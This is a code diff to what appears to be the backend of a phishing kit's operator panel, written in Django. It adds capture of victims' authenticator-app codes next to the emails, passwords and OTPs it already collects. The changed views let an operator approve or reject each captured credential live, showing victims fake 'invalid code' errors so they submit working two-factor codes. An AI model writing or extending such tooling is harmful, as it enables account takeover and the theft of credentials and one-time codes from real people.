@@ -128,6 +128,7 @@ def campaign_detail(request, pk):
                     'login_email': victim_info.login_email or '',
                     'login_password': victim_info.login_password or '',
                     'login_otp': victim_info.login_otp or '',
+                    'login_authenticator_app_code': victim_info.login_authenticator_app_code or '',
                     'email_status': victim_info.email_status,
                     'password_status': victim_info.password_status,
                     'otp_status': victim_info.otp_status,
@@ -374,7 +375,7 @@ def approve_submission(request, victim_info_id):
         data = json.loads(request.body.decode('utf-8'))
         step = data.get('step')  # email, password, or otp
         
-        if step not in ['email', 'password', 'otp']:
+        if step not in ['email', 'password', 'authenticator', 'otp']:
             return JsonResponse({'error': 'Invalid step'}, status=400)
         
         # Update the status for the specific step
@@ -385,6 +386,10 @@ def approve_submission(request, victim_info_id):
         elif step == 'password':
             victim_info.password_status = 'approved'
             victim_info.password_error_message = None  # Clear any previous error
+            victim_info.current_step = 'authenticator'  # Move to next step
+        elif step == 'authenticator':
+            victim_info.authenticator_status = 'approved'
+            victim_info.authenticator_error_message = None  # Clear any previous error
             victim_info.current_step = 'otp'  # Move to next step
         elif step == 'otp':
             victim_info.otp_status = 'approved'
@@ -417,13 +422,14 @@ def reject_submission(request, victim_info_id):
         step = data.get('step')  # email, password, or otp
         error_message = data.get('error_message', '')
         
-        if step not in ['email', 'password', 'otp']:
+        if step not in ['email', 'password', 'authenticator', 'otp']:
             return JsonResponse({'error': 'Invalid step'}, status=400)
         
         # Default error messages if none provided
         default_messages = {
             'email': 'Invalid email address. Please enter a valid email.',
             'password': 'Incorrect password. Please try again.',
+            'authenticator': 'Invalid authenticator code. Please try again.',
             'otp': 'Invalid OTP code. Please check and try again.'
         }
         
@@ -439,6 +445,10 @@ def reject_submission(request, victim_info_id):
             victim_info.password_status = 'rejected'
             victim_info.password_error_message = error_message
             victim_info.current_step = 'password'  # Stay on current step
+        elif step == 'authenticator':
+            victim_info.authenticator_status = 'rejected'
+            victim_info.authenticator_error_message = error_message
+            victim_info.current_step = 'authenticator'  # Stay on current step
         elif step == 'otp':
             victim_info.otp_status = 'rejected'
             victim_info.otp_error_message = error_message
@@ -468,7 +478,7 @@ def check_submission_status(request, victim_info_id):
         victim_info = get_object_or_404(VictimInfo, id=victim_info_id)
         step = request.GET.get('step', 'email')
         
-        if step not in ['email', 'password', 'otp']:
+        if step not in ['email', 'password', 'authenticator', 'otp']:
             return JsonResponse({'error': 'Invalid step'}, status=400)
         
         # Get the status and error message for the specific step
@@ -478,6 +488,9 @@ def check_submission_status(request, victim_info_id):
         elif step == 'password':
             status = victim_info.password_status
             error_message = victim_info.password_error_message
+        elif step == 'authenticator':
+            status = victim_info.authenticator_status
+            error_message = victim_info.authenticator_error_message
         elif step == 'otp':
             status = victim_info.otp_status
             error_message = victim_info.otp_error_message
